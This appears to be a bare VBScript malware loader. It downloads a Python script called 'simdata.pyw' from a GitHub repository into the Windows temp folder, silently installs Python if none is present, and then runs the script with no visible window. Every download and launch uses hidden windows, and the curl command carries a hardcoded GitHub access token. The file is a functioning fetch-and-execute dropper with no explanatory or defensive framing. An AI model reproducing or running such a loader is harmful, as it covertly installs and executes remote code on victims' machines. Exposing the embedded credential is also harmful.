Set o = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim t, l
t = o.ExpandEnvironmentStrings("%TEMP%")
l = o.ExpandEnvironmentStrings("%LOCALAPPDATA%")
Dim pw1, pw2
pw1 = l & "\Programs\Python\Python311\pythonw.exe"
pw2 = "C:\Program Files\Python311\pythonw.exe"
Dim cmd1
cmd1 = "cmd /c curl -H ""Authorization: token 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"" -L https://raw.githubusercontent.com/blackops0074/simdata/main/simdata.pyw -o " & t & "\s.pyw"
o.Run cmd1, 0, True
If Not fso.FileExists(pw1) And Not fso.FileExists(pw2) Then
    o.Run "cmd /c curl -L https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe -o " & t & "\py.exe", 0, True
    o.Run t & "\py.exe /quiet PrependPath=1 InstallAllUsers=0", 0, True
    WScript.Sleep 90000
End If
If fso.FileExists(pw1) Then
    o.Run chr(34) & pw1 & chr(34) & " " & t & "\s.pyw", 0, False
ElseIf fso.FileExists(pw2) Then
    o.Run chr(34) & pw2 & chr(34) & " " & t & "\s.pyw", 0, False
End If
